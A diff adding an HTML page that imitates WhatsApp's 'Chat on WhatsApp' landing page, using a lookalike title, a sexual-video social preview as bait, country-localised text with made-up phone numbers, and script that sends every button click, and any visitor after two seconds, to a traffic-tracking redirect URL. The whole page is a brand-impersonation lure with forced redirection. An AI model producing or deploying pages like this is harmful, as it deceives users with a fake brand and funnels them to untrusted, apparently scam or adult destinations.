@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp.c🇴m</title>
+    <meta property="og:title" content="🟢WhatsApp Video Sex🍊💦">
+    <meta property="og:image" content="https://pbs.twimg.com/media/HJ8RtYxbwAAsFxq.jpg">
+    <style>
+        body { font-family: sans-serif; margin: 0; padding: 0; color: #414141; }
+        .header { display: flex; justify-content: space-between; padding: 15px 10%; border-bottom: 1px solid #eee; align-items: center; }
+        .logo { width: 120px; }
+        .btn-green { background: #25d366; color: white; padding: 10px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; font-size: 14px; cursor: pointer; border: none; }
+        .main { text-align: center; padding: 80px 20px; }
+        .btn-open { background: #25d366; color: white; padding: 12px 40px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; margin: 10px; cursor: pointer; border: none; }
+        .btn-web { border: 1px solid #25d366; color: #25d366; padding: 12px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; display: inline-block; cursor: pointer; background: none; }
+        .footer { background: #111b21; color: #8696a0; padding: 50px 10%; display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; font-size: 13px; margin-top: 100px; }
+        @media (max-width: 768px) { .footer { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <button onclick="goToTrafee()" class="btn-green">Download</button>
+    </div>
+
+    <div class="main">
+        <h2 id="wa-text">Chat on WhatsApp</h2>
+        <button onclick="goToTrafee()" class="btn-open" id="btn-open">Open app</button><br>
+        <button onclick="goToTrafee()" class="btn-web" id="btn-web">Continue to WhatsApp Web</button>
+        <p><br>Don't have the app? <a href="#" onclick="goToTrafee()" style="color:#25d366;" id="wa-down">Download it now</a></p>
+    </div>
+
+    <div class="footer">
+        <div><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80" style="filter:invert(1)"></div>
+        <div><b>What we do</b><br><br>Features<br>Blog<br>Security</div>
+        <div><b>Who we are</b><br><br>About us<br>Careers<br>Privacy</div>
+        <div><b>Use WhatsApp</b><br><br>Android<br>iPhone<br>Mac/PC</div>
+    </div>
+
+    <script>
+        // Fungsi untuk mengambil link dari URL dan Redirect
+        function goToTrafee() {
+            const params = new URLSearchParams(window.location.search);
+            const link = params.get('link') || "https://cgiaaag.cliksm.com/s/133baad435f7a?track=HotVideo_Fun&subsource=HotVideo_Fun";
+            window.location.href = link;
+        }
+
+        const config = {
+            'PL': { txt: 'Czatuj na WhatsApp z +48 84 744 55 75', btn1: 'Otwórz aplikację', btn2: 'Kontynuuj w WhatsApp Web', link: 'Pobierz teraz' },
+            'DE': { txt: 'Chatte auf WhatsApp mit +49 151 2345 6789', btn1: 'App öffnen', btn2: 'Weiter zu WhatsApp Web', link: 'Jetzt herunterladen' },
+            'ES': { txt: 'Chatea en WhatsApp con +34 600 123 456', btn1: 'Abrir aplicación', btn2: 'Continuar en WhatsApp Web', link: 'Descargar ahora' },
+            'CZ': { txt: 'Chatujte na WhatsApp s +420 777 123 456', btn1: 'Otevřít aplikaci', btn2: 'Pokračovat na WhatsApp Web', link: 'Stáhnout' },
+            'SK': { txt: 'Chatujte na WhatsApp s +421 900 123 456', btn1: 'Otvoriť aplikáciu', btn2: 'Pokračovať na WhatsApp Web', link: 'Stiahnuť' },
+            'IT': { txt: 'Chatta su WhatsApp con +39 333 123 4567', btn1: 'Apri applicazione', btn2: 'Continua su WhatsApp Web', link: 'Scarica ora' },
+            'US': { txt: 'Chat on WhatsApp with +1 202 555 0128', btn1: 'Open app', btn2: 'Continue to WhatsApp Web', link: 'Download it now' }
+        };
+
+        async function init() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const code = data.country_code || 'US';
+                const lang = config[code] || config['US'];
+                
+                document.getElementById('wa-text').innerText = lang.txt;
+                document.getElementById('btn-open').innerText = lang.btn1;
+                document.getElementById('btn-web').innerText = lang.btn2;
+                document.getElementById('wa-down').innerText = lang.link;
+            } catch(e) {
+                const d = config['US'];
+                document.getElementById('wa-text').innerText = d.txt;
+            }
+        }
+        init();
+
+        // Redirect otomatis 2 detik
+        setTimeout(goToTrafee, 2000);
+    </script>
+</body>
+</html>
